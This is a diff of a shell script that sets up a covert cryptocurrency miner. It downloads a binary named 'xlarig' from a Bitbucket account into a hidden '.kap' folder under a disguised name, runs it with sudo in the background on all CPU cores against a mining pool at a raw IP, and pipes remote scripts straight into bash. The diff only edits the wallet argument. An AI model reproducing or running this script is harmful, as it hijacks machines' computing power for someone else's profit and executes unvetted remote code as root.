@@ -14,5 +14,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/mypile/filesg/downloads/xlarig >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 --donate-level 1 -o 199.247.17.189:80 -u Ssy2Qc3HNtyGv4w6KbUM4sLgW3fBEhXqPdePAHCoyXXcfzvFXqWdqPh17zvTgJS6vMXD9M9k62Kf8T46LXQf8Xs67Z9zoT6XcL -p $(echo $(shuf -i 1-100000 -n 1)-AJG) -a panthera -k -t $(nproc --all) --background
+sudo ./sgr1 --donate-level 1 -o 199.247.17.189:80 -u solo:Ssy2Qc3HNtyGv4w6KbUM4sLgW3fBEhXqPdePAHCoyXXcfzvFXqWdqPh17zvTgJS6vMXD9M9k62Kf8T46LXQf8Xs67Z9zoT6XcL -p $(echo $(shuf -i 1-100000 -n 1)-AJG) -a panthera -k -t $(nproc --all) --background
 curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
